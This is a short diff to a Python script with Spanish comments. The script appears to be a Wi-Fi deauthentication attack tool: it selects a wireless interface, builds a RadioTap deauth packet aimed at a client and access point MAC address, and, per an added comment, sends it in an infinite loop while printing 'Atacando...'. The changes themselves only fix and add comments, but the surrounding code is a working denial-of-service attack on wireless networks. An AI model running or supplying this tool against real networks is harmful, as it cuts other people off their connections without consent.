@@ -35,13 +35,14 @@ if __name__ == "__main__":
         z = 0
         print("Elige una interfaz de red: \n")
         
-        # Filtramos aquellas que no son vlan
+        # Filtramos aquellas que no son wlan
         for i,nombre in enumerate(lista_interfaces):
             
             if lista_interfaces[i][0:4] != 'wlan': 
                 lista_interfaces.remove(lista_interfaces[i])
                 i = i -1
                 
+        # Imprimimos las interfaces por pantalla
         for i,nombre in enumerate(lista_interfaces):
            
                 print(str(i + 1) + ". " + nombre)
@@ -73,7 +74,8 @@ if __name__ == "__main__":
             print("Activando interfaz...")
         
         
-        
+        # Enviamos el paquete en un bucle infinito (loop=1)
+        # RadioTap() nos permite trasmitir información entre capas OSI de forma más fácil
                  
         paquete = RadioTap()/craftear_paquete_deauth(mac_cliente,mac_ap)
         print("Atacando...(Ctrl-C para parar)")
